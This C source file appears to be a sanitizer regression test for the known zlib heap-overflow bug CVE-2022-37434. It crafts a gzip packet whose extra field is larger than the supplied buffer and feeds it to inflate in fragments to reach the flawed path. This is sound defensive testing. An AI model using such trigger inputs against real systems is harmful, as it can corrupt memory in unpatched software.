/* Historical CVE-2022-37434 regression draft, NOT a new finding.
 * Compile only against explicitly selected and hashed zlib sources.
 * Run vulnerable sources only after approval in an isolated sanitizer process.
 * No network, files, shell, arbitrary input or arbitrary allocation sizes.
 * A successful run checks decompression and the documented extra_max contract.
 * A nonzero exit alone is NOT vulnerability evidence: inspect the sanitizer log.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#ifndef WILDTRACE_FIXTURE_ONLY
#include "zlib.h"
#endif

static const unsigned char expected[] = "WT-CASE\n";
enum { EXTRA_LENGTH = 32, SMALL_CAPACITY = 8, FIRST_EXTRA = 12 };

static uint32_t local_crc32(const unsigned char *p, size_t n)
{
    uint32_t crc = UINT32_C(0xffffffff);
    while (n--) {
        crc ^= *p++;
        for (unsigned i = 0; i != 8; ++i)
            crc = (crc >> 1) ^ ((crc & 1) ? UINT32_C(0xedb88320) : 0);
    }
    return crc ^ UINT32_C(0xffffffff);
}

static void le32(unsigned char *p, uint32_t x)
{
    for (unsigned i = 0; i != 4; ++i) p[i] = (unsigned char)(x >> (8 * i));
}

static size_t make_packet(unsigned char packet[128])
{
    const unsigned char header[10] = {0x1f, 0x8b, 8, 4, 0, 0, 0, 0, 0, 255};
    memset(packet, 0, 128);
    memcpy(packet, header, sizeof header);
    packet[10] = EXTRA_LENGTH;
    /* One syntactically valid FEXTRA subfield: WT, payload length 28. */
    packet[12] = 'W'; packet[13] = 'T'; packet[14] = EXTRA_LENGTH - 4;
    for (unsigned i = 16; i != 12 + EXTRA_LENGTH; ++i) packet[i] = 'A';
    size_t pos = 12 + EXTRA_LENGTH;
    unsigned count = (unsigned)(sizeof expected - 1);
    packet[pos++] = 1; /* final, uncompressed DEFLATE block */
    packet[pos++] = (unsigned char)count; packet[pos++] = 0;
    packet[pos++] = (unsigned char)(count ^ 255); packet[pos++] = 255;
    memcpy(packet + pos, expected, count); pos += count;
    le32(packet + pos, local_crc32(expected, count)); pos += 4;
    le32(packet + pos, count); pos += 4;
    return pos;
}

#ifdef WILDTRACE_FIXTURE_ONLY
/* This build does not include or link zlib and cannot execute the target.
 * It emits the exact shared test input for independent gzip/CRC validation.
 */
int main(void)
{
    unsigned char packet[128];
    size_t size = make_packet(packet);
    return fwrite(packet, 1, size, stdout) == size ? 0 : 70;
}
#else
int main(int argc, char **argv)
{
    if (argc != 2) {
        fprintf(stderr, "mode: fragmented | whole | no-capture | full-capacity\n");
        return 64;
    }
    int whole = strcmp(argv[1], "whole") == 0;
    int no_capture = strcmp(argv[1], "no-capture") == 0;
    int full_capacity = strcmp(argv[1], "full-capacity") == 0;
    if (!whole && !no_capture && !full_capacity && strcmp(argv[1], "fragmented") != 0)
        return 64;
    unsigned char packet[128];
    size_t pos = make_packet(packet);
    unsigned count = (unsigned)(sizeof expected - 1);

    size_t capacity = full_capacity ? EXTRA_LENGTH : SMALL_CAPACITY;
    unsigned char *extra = malloc(capacity);
    if (extra == NULL) return 70;
    memset(extra, 0xcc, capacity);
    unsigned char output[64] = {0};
    z_stream stream = {0};
    gz_header header = {0};
    header.extra = extra; header.extra_max = (uInt)capacity;
    int rc = inflateInit2(&stream, 31);
    if (rc != Z_OK) { free(extra); return 71; }
    if (!no_capture && inflateGetHeader(&stream, &header) != Z_OK) {
        inflateEnd(&stream); free(extra); return 72;
    }
    stream.next_out = output; stream.avail_out = sizeof output;
    size_t first = whole ? pos : 12 + FIRST_EXTRA;
    stream.next_in = packet; stream.avail_in = (uInt)first;
    fprintf(stderr, "CASE_START mode=%s zlib=%s input=%zu extra_len=%d capacity=%zu first_extra=%d\n",
            argv[1], zlibVersion(), pos, EXTRA_LENGTH, capacity, FIRST_EXTRA);
    fflush(stderr);
    rc = inflate(&stream, Z_NO_FLUSH);
    if (!whole) {
        if (rc != Z_OK || stream.avail_in != 0) {
            fprintf(stderr, "CASE_INVALID first_return=%d remaining=%u\n", rc, stream.avail_in);
            inflateEnd(&stream); free(extra); return 73;
        }
        stream.next_in = packet + first;
        stream.avail_in = (uInt)(pos - first);
        rc = inflate(&stream, Z_NO_FLUSH);
    }
    int valid = rc == Z_STREAM_END && stream.total_out == count &&
                stream.avail_in == 0 && memcmp(output, expected, count) == 0;
    if (!no_capture)
        valid = valid && header.done == 1 && header.extra_len == EXTRA_LENGTH &&
                memcmp(extra, packet + 12, capacity) == 0;
    int ended = inflateEnd(&stream);
    free(extra);
    if (!valid || ended != Z_OK) {
        fprintf(stderr, "CASE_INVALID final_return=%d end_return=%d\n", rc, ended);
        return 74;
    }
    printf("{\"status\":\"roundtrip_and_capture_passed\",\"mode\":\"%s\","
           "\"input_bytes\":%zu,\"output_bytes\":%u,\"counts_as_new_vulnerability\":false}\n",
           argv[1], pos, count);
    return 0;
}
#endif
